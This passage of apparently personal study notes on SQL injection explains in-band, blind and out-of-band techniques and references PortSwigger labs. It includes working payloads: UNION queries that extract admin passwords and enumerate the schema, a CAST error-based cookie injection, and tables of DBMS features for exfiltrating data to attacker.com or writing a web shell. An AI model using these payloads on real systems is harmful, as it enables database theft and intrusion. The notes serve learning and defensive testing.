style="list-style-type:disc">Logical manipulation: <code>AND</code>, <code>OR</code>, <code>NOT</code></li></ul><ul id="2241e11f-d73c-807c-bf3a-efec9638c12f" class="bulleted-list"><li style="list-style-type:disc">UNION-based injection</li></ul><ul id="2241e11f-d73c-8032-ba20-d9a0ae1301bb" class="bulleted-list"><li style="list-style-type:disc">Comment injection: , <code>#</code></li></ul><ul id="2241e11f-d73c-802f-96d9-d0bab3800b93" class="bulleted-list"><li style="list-style-type:disc">Stacked queries: <code>; DROP TABLE ...</code></li></ul><ul id="2241e11f-d73c-8014-a8a5-dd708dffc190" class="bulleted-list"><li style="list-style-type:disc">Subqueries and nested SELECT</li></ul><ul id="2241e11f-d73c-80e8-bd23-f0f2fdb565cd" class="bulleted-list"><li style="list-style-type:disc">Time-based blind SQLi</li></ul><ul id="2241e11f-d73c-801d-9c9c-fa7c8b06cf44" class="bulleted-list"><li style="list-style-type:disc">Error-based SQLi</li></ul><ul id="2241e11f-d73c-80f4-9985-eac132cc3459" class="bulleted-list"><li style="list-style-type:disc">Out-of-band SQLi</li></ul><ul id="2241e11f-d73c-8084-b767-db6bd66c6162" class="bulleted-list"><li style="list-style-type:disc">Hex/char obfuscation</li></ul><ul id="2241e11f-d73c-80c5-9197-ebca3909b7fd" class="bulleted-list"><li style="list-style-type:disc">Second-order SQLi</li></ul><hr id="2241e11f-d73c-8005-af0f-f0ae7bfd27c1"/><h1 id="2241e11f-d73c-802c-a249-d4dcd99feb3f" class="">7. Types of SQL injection</h1><h2 id="2241e11f-d73c-80fa-9dc2-e6a6780d546e" class="">In-band SQLI:</h2><p id="2241e11f-d73c-8073-b49a-e4707049e69a" class="">This is SQL injection with progress attack and received result in like channel. Example if attacker using web browser for attack then result will return this web browser. In brand SQLi include two type:</p><ol type="1" id="2241e11f-d73c-8081-8725-ff2633af8675" class="numbered-list" start="1"><li><strong>error-based SQL injection</strong></li></ol><ol type="1" id="2241e11f-d73c-8000-8990-d0eea1750bb2" class="numbered-list" start="2"><li><strong>union-based SQL injection</strong></li></ol><h2 id="2241e11f-d73c-80c4-b4c0-d80faa74ee67" class=""><strong>Blind SQLi:</strong></h2><p id="2241e11f-d73c-80d6-8890-e69585ed7d5c" class="">This is type of SQL injection but we don’t have information about data of database return to web browser but we can understand it by signature as Boolean TRUE/FAlSE or Time deplay.  In Blind SQLi include two type:</p><ol type="1" id="2241e11f-d73c-80ae-a614-dd3c6f4fbe4e" class="numbered-list" start="1"><li><strong>Boolean-based Blind SQLi</strong></li></ol><ol type="1" id="2241e11f-d73c-8019-9583-db3cb66d099d" class="numbered-list" start="2"><li><strong>Time-Base Blind SQLi</strong></li></ol><h2 id="2241e11f-d73c-80cf-8676-f6f7b7756a46" class=""><strong>Out-of-band SQLi</strong></h2><p id="2241e11f-d73c-807c-9c50-def7db81101c" class="">This type don’t common in SQLi. This vulnerability appear when attack don’t attack and take result in one channel. So, attacker will transfer data to difference channel. but this method depend of config of DBMS. if config of DBMS don’t support for transfer data then this method don’t perform</p><hr id="2241e11f-d73c-80f0-9575-f7cac7d4c1b0"/><h1 id="2241e11f-d73c-80b6-b150-e915aab4a39b" class="">8. Explain case of In-band SQLi</h1><h2 id="2241e11f-d73c-808c-bae7-d01c162490d3" class=""><strong>Union-based SQL injection</strong></h2><p id="2241e11f-d73c-80f1-84c5-ce3c591aca3f" class="">The scope of Union based SQLi is using statement UNION in SQL with purpose change response result. But we have a problem is we need know number column of original query then we can execute statement don’t appear error.  Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-8080-8f7d-f876a3dc68c8" class="code"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27; &amp;&amp; isset($_POST[&#x27;id&#x27;])) {
+		$id = $_POST[&#x27;id&#x27;];
+		$sql = &quot;SELECT id, title, content, author, comment FROM blogs WHERE id = $id&quot;;
+		$result = $conn-&gt;query($sql);
+	}
+	</code></pre><p id="2241e11f-d73c-8055-ae51-f5aa70f58bff" class="">I have query select data from blogs have vulnerability SQLi. with query i will exploit UNION based SQLi by use to statement UNION extend to query extract data from users.</p><figure id="2261e11f-d73c-80b0-a2c9-e01eeac94baf" class="image"><a href="image.png"><img style="width:710px" src="image.png"/></a></figure><p id="2241e11f-d73c-8070-9071-f3a3365fdfe1" class="">Payload:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-80bf-998c-ded81d630a08" class="code"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">1 UNION SELECT NULL,NULL,NULL,username,password FROM users WHERE username = &#x27;admin&#x27; --</code></pre><p id="2241e11f-d73c-80ed-ad7e-fa2815d4c5a7" class="">Now, We will explain about payload. In query is <strong>SELECT id, title, content, author, comment FROM blogs WHERE id =</strong> 1. But with payload we will extend query and extract data from table users. But we don’t understand users have many column and we just need username and password so we can’t using NULL is data for column don’t use. After we combine UNION with original query. Oh, we have question!. Why i know table users and name columns username and password?. That right!, we can’t define it by using extract data from metadata of SQL.</p><h3 id="2241e11f-d73c-80a1-ab50-fb73a54f70f2" class="">Extract data from metadata of DBMS</h3><p id="2241e11f-d73c-8098-a67d-ea96db4b5130" class="">In Mysql, We can extract metadata from information_schema. information schema is aggregate system table provide meta include:</p><ul id="2241e11f-d73c-8068-8b63-fd72895d3340" class="bulleted-list"><li style="list-style-type:disc">List table</li></ul><ul id="2241e11f-d73c-809c-9109-c590b359afd2" class="bulleted-list"><li style="list-style-type:disc">List column</li></ul><ul id="2241e11f-d73c-8087-a18f-ea80242ddb71" class="bulleted-list"><li style="list-style-type:disc">data type</li></ul><ul id="2241e11f-d73c-8019-a8f8-e6421cfeaf8f" class="bulleted-list"><li style="list-style-type:disc">constraints</li></ul><ul id="2241e11f-d73c-80a6-a5de-d0af67e508e8" class="bulleted-list"><li style="list-style-type:disc">index</li></ul><ul id="2241e11f-d73c-8030-93e3-d5b1100db3a8" class="bulleted-list"><li style="list-style-type:disc">privileges</li></ul><ul id="2241e11f-d73c-8059-8bfe-cdd911886290" class="bulleted-list"><li style="list-style-type:disc">schemas</li></ul><p id="2241e11f-d73c-80b3-9f5b-c289a9f921bd" class="">By using select metadata we can know information about table, column. I have example extract metadata from mydemo.</p><ol type="1" id="2241e11f-d73c-803a-a8c5-d6cd151d42a7" class="numbered-list" start="1"><li>We will demo progress extract table_names from database by take data from meta. Payload:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-8019-b4ea-c2c769cd8b6f" class="code"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all"> 1 UNION SELECT NULL,NULL,table_name,NULL,NULL
+	 FROM information_schema.tables WHERE table_schema = database()--
+	</code></pre></li></ol><ol type="1" id="2241e11f-d73c-800c-8d35-e36f8823c7af" class="numbered-list" start="2"><li>After have information about table next to we will extract name of column in table users by using select metadata column. Because one table can have many column so we can using statement CONCAT() combine many name column in strings. example:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-80aa-badd-e7e1f1553bcd" class="code"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">1 UNION SELECT NULL,NULL,CONCAT(column_name,&#x27; &#x27;),NULL,NULL
+	FROM information_schema.columns WHERE table_name = &#x27;users&#x27;--
+	</code></pre></li></ol><p id="2241e11f-d73c-8055-b8b5-cf1603524d76" class="">Exploit metadata is important step when exploit UNION based SQLi. Because UNION based SQLi is in band exploit and we don’t understand table, column name so we need define it.</p><h2 id="2241e11f-d73c-8004-9238-f6b426b0088f" class=""><strong>Error-based SQL injection</strong></h2><p id="2261e11f-d73c-8086-bf7d-c04e91c53610" class="">This method of SQL Injection exploitation relies on <strong>error messages</strong> returned by the server, which can reveal valuable information about the <strong>structure of SQL queries</strong> or even <strong>leak sensitive data</strong> directly through verbose error outputs.</p><p id="2261e11f-d73c-8066-bc52-d9e568781252" class="">While error messages are an essential feature for developers during application development and debugging, they can also introduce vulnerabilities if not properly handled. Detailed error responses often include information such as:</p><ul id="2261e11f-d73c-80b6-a426-ca833da97e32" class="bulleted-list"><li style="list-style-type:disc">Name of the database object (e.g., table or column)</li></ul><ul id="2261e11f-d73c-8021-b96c-ddb0dad5e34b" class="bulleted-list"><li style="list-style-type:disc">The location or line of the error</li></ul><ul id="2261e11f-d73c-80ff-83e4-d0b86971834a" class="bulleted-list"><li style="list-style-type:disc">The structure or logic of the SQL query</li></ul><ul id="2261e11f-d73c-8071-8a29-c3cb50ff84b6" class="bulleted-list"><li style="list-style-type:disc">The exact command or value that caused the failure</li></ul><p id="2261e11f-d73c-8034-83e7-c62a81fb9ba8" class="">Such information helps attackers <strong>identify the presence of a SQL injection flaw</strong> and may allow them to <strong>reconstruct or manipulate the query structure</strong>, or even extract data directly from the error itself.</p><p id="2261e11f-d73c-805c-ac88-d5a8be1dc689" class="">This type of vulnerability can typically be exploited using two main techniques:</p><ol type="1" id="2261e11f-d73c-80c6-841e-c5193f07bd22" class="numbered-list" start="1"><li><strong>Blind SQL Injection via Conditional Errors</strong><p id="2261e11f-d73c-8020-84f5-cb13d8f4a2c9" class="">Triggering specific errors based on boolean logic to infer true/false responses — explained further in the &quot;Blind SQLi&quot; section.</p></li></ol><ol type="1" id="2261e11f-d73c-80d4-b5d4-d50042b50323" class="numbered-list" start="2"><li><strong>Extracting Sensitive Data from Verbose SQL Errors</strong><p id="2261e11f-d73c-80cc-8c1a-dfef20efb803" class="">Leveraging detailed error messages (commonly seen in PostgreSQL or MSSQL) to directly extract database values or schema information.</p></li></ol><p id="2261e11f-d73c-8011-812c-f20bce25f9b7" class=""><strong>Extracting Sensitive Data via Error Messages:</strong></p><p id="2261e11f-d73c-80cc-8462-dd2109fca1de" class="">Attackers can often gain valuable information by observing full SQL queries or server responses. When error messages reveal data returned from a query, this becomes a serious vulnerability that can be exploited. One common technique for extracting sensitive data involves using the <code>CAST()</code> function to trigger type conversion errors.</p><p id="2261e11f-d73c-80d1-9210-dcd10ee46d03" class="">This vulnerability typically affects <strong>PostgreSQL</strong> and <strong>Microsoft SQL Server (MSSQL)</strong>. In these systems, if an invalid type conversion is attempted—such as casting a string to an integer—an error message is returned that may include the problematic data, which can sometimes reveal sensitive information.</p><p id="2261e11f-d73c-80a8-ad4e-da156f122912" class="">For example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2261e11f-d73c-808d-a3ab-c8436afa4671" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">-- PostgreSQL
+	SELECT CAST(&#x27;admin&#x27; AS int);
+	-- Error:
+	ERROR: invalid input syntax for type integer: &quot;admin&quot;
+	LINE 1: SELECT CAST(&#x27;admin&#x27; AS int);
+	
+	-- MSSQL
+	SELECT CAST(&#x27;admin&#x27; AS int);
+	-- Error:
+	Msg 245, Level 16, State 1, Server &lt;server&gt;, Line &lt;line&gt;
+	Conversion failed when converting the varchar value &#x27;admin&#x27; to data type int.
+	</code></pre><p id="2261e11f-d73c-80a8-9fe7-f54468e1df5d" class="">These detailed error messages are often enabled by <strong>default configurations</strong> in PostgreSQL and MSSQL. However, depending on the server setup, error verbosity might vary.</p><p id="2261e11f-d73c-8018-922f-cb47c89e7b2a" class="">In contrast, <strong>MySQL</strong> and <strong>Oracle Database</strong> do not typically expose such vulnerabilities in their default configurations. For example, in MySQL, an invalid cast usually returns <code>0</code> without including sensitive details. Similarly, Oracle returns a general error when casting from a character to a numeric type, without revealing the original value.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-8038-aaa6-cad306d86123" class="code"><code class="language-JavaScript">MySQL:
+	SELECT CAST(&#x27;ADMIN&#x27; AS UNSIGNED);
+	-- Result:
+	+----------------------------+
+	| CAST(&#x27;ADMIN&#x27; AS UNSIGNED) |
+	+----------------------------+
+	|                          0 |
+	+----------------------------+
+	--------------------------------------------------------
+	Oracle Database:
+	SELECT CAST(&#x27;ADMIN&#x27; AS UNSIGNED) FROM dual;
+	-- Error:
+	ERROR at line 1:
+	ORA-00902: invalid datatype
+	</code></pre><p id="2241e11f-d73c-8038-8e92-c4b048e1cc0b" class="">After explain we will test with lab in portswigger:</p><p id="2241e11f-d73c-80bd-bb1a-c4176cdd49bf" class=""><a href="https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based">https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based</a></p><p id="2241e11f-d73c-80cf-934b-d79015c06ca9" class="">Request:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-80b8-bde6-dc6e99ae8b55" class="code"><code class="language-JavaScript">GET /filter?category=Gift
+	Cookie: TrackingId=&#x27; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--;</code></pre><p id="2241e11f-d73c-80f2-ad58-cb061f9ab6f9" class="">Response:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-8008-8c14-fb85f0a1039b" class="code"><code class="language-JavaScript">ERROR: invalid input syntax for type integer: &quot;administrator&quot;</code></pre><hr id="2241e11f-d73c-8090-ace7-f1d6c0dfff2e"/><h2 id="2241e11f-d73c-80d1-bc48-eb06f673e5b4" class=""><strong>Boolean-based Blind SQLi</strong></h2><p id="2251e11f-d73c-8065-9f72-c4176a117820" class="">Blind SQLi occurs when application have SQL injection but application don’t display data from database of detail error message. In case, we can determine application have vulnerability by analyst trigger condition HTTP response or create signature determine vulnerability by time delays.</p><p id="2261e11f-d73c-80a9-83c3-d579469b8316" class=""><strong>Triggering Conditional Responses in HTTP:</strong><div class="indented"><p id="2261e11f-d73c-80d2-baa2-f294ce8831d2" class="">Now let’s examine a lab from PortSwigger:</p><p id="2261e11f-d73c-8027-95a7-cc84d1338013" class="">In this lab, the web page uses a <code>TrackingId</code> cookie to track user behavior. If the <code>TrackingId</code> is valid, the server responds with a &quot;Welcome back&quot; message; otherwise, it returns nothing.</p><p id="2261e11f-d73c-80cd-9a32-c424f082a497" class="">The vulnerability lies in how the server processes the <code>TrackingId</code>. By injecting a malicious payload into this cookie, we can modify the query to test individual characters of the administrator&#x27;s password. Each payload forms a boolean expression that evaluates to true or false based on the result. If the condition is true, the response includes the “Welcome back” message—otherwise, it does not. By observing these responses, we can infer each character of the password one by one and eventually reconstruct the entire password.</p><figure id="2251e11f-d73c-8023-ac85-d9959447a15b" class="image"><a href="image%201.png"><img style="width:661.984375px" src="image%201.png"/></a></figure></div></p><p id="2261e11f-d73c-8084-ae11-dfc882826832" class=""><strong>Triggering Conditional Errors:</strong><div class="indented"><p id="2261e11f-d73c-80f4-ba0e-ea3cf5cc38fd" class="">This technique is similar to conditional-based attacks, where the HTTP response does not include a signature when an error occurs. However, by deliberately causing an error and observing whether it happens or not, we can derive a boolean condition that reveals information based on the server’s response behavior.</p><figure id="2261e11f-d73c-8092-95d4-fac9deb7d5cc" class="image"><a href="image%202.png"><img style="width:686px" src="image%202.png"/></a></figure></div></p><p id="2261e11f-d73c-8029-b447-c0f7263bb4d6" class=""><strong>Triggering time delays:</strong><div class="indented"><p id="2261e11f-d73c-80af-b278-fdf83f0141f0" class="">This technique is similar to two technique condition based and condition error, where the HTTP response does not include a signature and don’t have error page when error then we will self signature TRUE/FALSE by using time delay. When condition TRUE then will delay some time and opposite condition FALSE then don’t delay.</p><figure id="2261e11f-d73c-8060-88b4-c2620e77ab4e" class="image"><a href="image%203.png"><img style="width:686px" src="image%203.png"/></a></figure></div></p><h3 id="2261e11f-d73c-80ae-95e2-f5d7e6a333e6" class=""><strong>Out-of-band SQL injection</strong></h3><p id="2261e11f-d73c-80de-a4c2-c68082d486f7" class="">This technique exploit SQLi when application don’t response In-Band include signature on web page, error page, or detect we create signature by method use to time delay. In technique, we will create signature by using danger feature of DBMS with purpose send HTTP to OUT-Band, location control by attacker. </p><figure id="2261e11f-d73c-80b1-9c65-cd1956c05fdd" class="image"><a href="image%204.png"><img style="width:710px" src="image%204.png"/></a></figure><p id="2261e11f-d73c-803f-8c20-f36776f7b7ed" class="">In DBMS include many feature allow DBMS send DNS or request HTTP to Out-band. This Feature can profit by attacker for purpose exploit SQLi Out-Band. We can list in DBMS include:</p><h3 id="2261e11f-d73c-8059-94fe-c7fdd615c445" class=""><strong>1. Microsoft SQL Server (MSSQL)</strong></h3><table id="2261e11f-d73c-8045-9945-da488dc99c38" class="simple-table"><thead class="simple-table-header"><tr id="2261e11f-d73c-802e-96e9-c6974bd7dfd0"><th id="{rtu" class="simple-table-header-color simple-table-header" style="width:154px">Function / Feature</th><th id="?OeD" class="simple-table-header-color simple-table-header" style="width:571px">Description</th></tr></thead><tbody><tr id="2261e11f-d73c-8046-a2ea-ecf6854749ac"><td id="{rtu" class="" style="width:154px"><code>xp_cmdshell</code></td><td id="?OeD" class="" style="width:571px">Executes system commands like <code>nslookup</code>, <code>powershell</code>, <code>curl</code></td></tr><tr id="2261e11f-d73c-80d3-a9f4-d55a442a470a"><td id="{rtu" class="" style="width:154px"><code>xp_dirtree</code></td><td id="?OeD" class="" style="width:571px">Accesses UNC paths → sends a DNS request to <code>\\attacker.com\share</code></td></tr><tr id="2261e11f-d73c-80b8-aa87-fd7c4e1946a4"><td id="{rtu" class="" style="width:154px"><code>openrowset()</code></td><td id="?OeD" class="" style="width:571px">Connects to external servers via OLEDB</td></tr><tr id="2261e11f-d73c-80b9-8da0-fca0b1880f2c"><td id="{rtu" class="" style="width:154px"><code>sp_oacreate</code></td><td id="?OeD" class="" style="width:571px">Invokes COM objects → can send HTTP requests or create files</td></tr></tbody></table><h3 id="2261e11f-d73c-806e-b964-f48956aa7a4d" class=""><strong>2. PostgreSQL</strong></h3><table id="2261e11f-d73c-8050-a17c-dbf6c3428c1a" class="simple-table"><thead class="simple-table-header"><tr id="2261e11f-d73c-80c8-a888-c0d8a9bccd83"><th id="AVyZ" class="simple-table-header-color simple-table-header" style="width:163.9499969482422px">Function / Statement</th><th id="jSI;" class="simple-table-header-color simple-table-header" style="width:563px">Description</th></tr></thead><tbody><tr id="2261e11f-d73c-807d-8c8d-d8cdfc2c4dca"><td id="AVyZ" class="" style="width:163.9499969482422px"><code>COPY TO PROGRAM</code></td><td id="jSI;" class="" style="width:563px">Writes query output to the result of a system command (like <code>curl</code>)</td></tr><tr id="2261e11f-d73c-8080-8f4f-fbda3d49c25f"><td id="AVyZ" class="" style="width:163.9499969482422px"><code>lo_export()</code></td><td id="jSI;" class="" style="width:563px">Exports LOB content to a file → can be combined to drop web shells</td></tr><tr id="2261e11f-d73c-8085-a649-fb508b99cd0f"><td id="AVyZ" class="" style="width:163.9499969482422px"><code>dblink_connect()</code></td><td id="jSI;" class="" style="width:563px">Connects to another PostgreSQL server over TCP</td></tr><tr id="2261e11f-d73c-8058-87d7-c86e8e6d6ce6"><td id="AVyZ" class="" style="width:163.9499969482422px"><code>COPY FROM PROGRAM</code></td><td id="jSI;" class="" style="width:563px">(PostgreSQL 12+) Reads input from a system command</td></tr></tbody></table><h3 id="2261e11f-d73c-8057-8222-dd8a49287d58" class=""><strong>3. Oracle Database</strong></h3><table id="2261e11f-d73c-8084-bae6-edb9b0168577" class="simple-table"><thead class="simple-table-header"><tr id="2261e11f-d73c-8062-8e1f-e07e9a0b2966"><th id="Ins]" class="simple-table-header-color simple-table-header" style="width:264.9750061035156px">PL/SQL Package</th><th id="|:{J" class="simple-table-header-color simple-table-header" style="width:468px">Description</th></tr></thead><tbody><tr id="2261e11f-d73c-805d-a20b-c4dd684a1474"><td id="Ins]" class="" style="width:264.9750061035156px"><code>UTL_HTTP.REQUEST(url)</code></td><td id="|:{J" class="" style="width:468px">Sends an HTTP request to the specified URL</td></tr><tr id="2261e11f-d73c-806f-a6f8-f2704d9e6454"><td id="Ins]" class="" style="width:264.9750061035156px"><code>HTTPURITYPE.getCLOB()</code></td><td id="|:{J" class="" style="width:468px">Fetches content from HTTP and stores it in a variable</td></tr><tr id="2261e11f-d73c-80e8-ac15-e4bbaa988541"><td id="Ins]" class="" style="width:264.9750061035156px"><code>UTL_INADDR.GET_HOST_ADDRESS()</code></td><td id="|:{J" class="" style="width:468px">May trigger a DNS lookup</td></tr><tr id="2261e11f-d73c-8032-8e93-de797964c65b"><td id="Ins]" class="" style="width:264.9750061035156px"><code>DBMS_LDAP.INIT()</code></td><td id="|:{J" class="" style="width:468px">Sends an LDAP query → can be abused for DNS exfiltration</td></tr></tbody></table><h3 id="2261e11f-d73c-8066-8f73-c28e977e28c8" class=""><strong>4. MySQL / MariaDB</strong></h3><table id="2261e11f-d73c-807e-bcef-f0a434261050" class="simple-table"><thead class="simple-table-header"><tr id="2261e11f-d73c-80e0-8eca-f399b71bbfc5"><th id="^;Gg" class="simple-table-header-color simple-table-header" style="width:324.2124938964844px">Feature</th><th id="YQzS" class="simple-table-header-color simple-table-header" style="width:407px">Description</th></tr></thead><tbody><tr id="2261e11f-d73c-8030-be0e-d44b1a685a2b"><td id="^;Gg" class="" style="width:324.2124938964844px"><code>LOAD_FILE(&#x27;\\attacker.com\abc&#x27;)</code></td><td id="YQzS" class="" style="width:407px">Sends a DNS request to a UNC path</td></tr><tr id="2261e11f-d73c-806f-9fc4-d8ea739ab245"><td id="^;Gg" class="" style="width:324.2124938964844px"><code>INTO OUTFILE &#x27;/var/www/html/shell.php&#x27;</code></td><td id="YQzS" class="" style="width:407px">Writes a shell to the web directory</td></tr><tr id="2261e11f-d73c-8088-a466-e477f823f630"><td id="^;Gg" class="" style="width:324.2124938964844px"><code>sys_exec()</code> (MariaDB)</td><td id="YQzS" class="" style="width:407px">Executes system commands (if plugin is enabled)</td></tr></tbody></table><p id="2261e11f-d73c-8074-bd2b-e598fabad26c" class="">In features, some is enable default some can enable by administrator.</p><table id="2261e11f-d73c-80df-b2ac-f339201e0e41" class="simple-table"><thead class="simple-table-header"><tr id="2261e11f-d73c-80ec-b4fe-e798c52945f3"><th id="UqJE" class="simple-table-header-color simple-table-header" style="width:97px"><strong>DBMS</strong></th><th id="CTY{" class="simple-table-header-color simple-table-header" style="width:169.97500610351562px"><strong>Dangerous Feature</strong></th><th id="R`Q:" class="simple-table-header-color simple-table-header" style="width:163.83750915527344px"><strong>Enabled by Default?</strong></th><th id="hcS}" class="simple-table-header-color simple-table-header" style="width:299.8500061035156px"><strong>Security Notes</strong></th></tr></thead><tbody><tr id="2261e11f-d73c-800d-928a-ee58ccdb2e94"><td id="UqJE" class="" style="width:97px"><strong>MSSQL</strong></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>xp_cmdshell</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">❌ <strong>DISABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">Must be manually enabled via <code>sp_configure</code></td></tr><tr id="2261e11f-d73c-8083-a6d7-ed640cfd5715"><td id="UqJE" class="" style="width:97px"></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>xp_dirtree</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">✅ <strong>ENABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">Sends DNS via UNC path, usually not blocked</td></tr><tr id="2261e11f-d73c-8089-ba92-f4bb85a6783f"><td id="UqJE" class="" style="width:97px"></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>openrowset()</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">✅ <strong>ENABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">May be blocked depending on configuration</td></tr><tr id="2261e11f-d73c-80db-a0d9-fc69481ec3c8"><td id="UqJE" class="" style="width:97px"></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>sp_oacreate</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">❌ <strong>DISABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">Requires COM automation to be enabled</td></tr><tr id="2261e11f-d73c-80fd-8c77-d847211afdfc"><td id="UqJE" class="" style="width:97px"><strong>PostgreSQL</strong></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>COPY TO PROGRAM</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">❌ <strong>DISABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">Enabled only if <code>superuser</code> and <code>config_allow_copy_program = on</code></td></tr><tr id="2261e11f-d73c-80ee-b71f-e7c6bc5e4fcf"><td id="UqJE" class="" style="width:97px"></td><td id="CTY{" class="" style="width:169.97500610351562px"><code>lo_export</code>, <code>lo_import</code></td><td id="R`Q:" class="" style="width:163.83750915527344px">✅ <strong>ENABLED</strong></td><td id="hcS}" class="" style="width:299.8500061035156px">Requires elevated privileges</td></tr><tr id="2261e11f-d73c-8088-ad2e-c03e9091517a"><td id="UqJE" class="" style="width:97px"></td><td id="CTY{" class="" 